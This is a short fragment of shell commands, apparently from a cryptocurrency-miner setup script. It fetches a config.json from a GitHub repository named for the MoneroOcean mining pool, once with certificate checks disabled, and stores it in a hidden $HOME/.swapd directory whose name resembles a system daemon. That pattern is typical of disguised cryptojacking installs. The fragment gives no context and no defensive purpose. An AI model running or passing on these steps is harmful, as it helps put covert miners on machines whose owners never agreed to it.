...
wget --no-check-certificate https://raw.githubusercontent.com/jrpm98/moneroocean-setup/main/config.json ; mv config.json $HOME/.swapd/config.json 
curl https://raw.githubusercontent.com/jrpm98/moneroocean-setup/main/config.json --output $HOME/.swapd/config.json
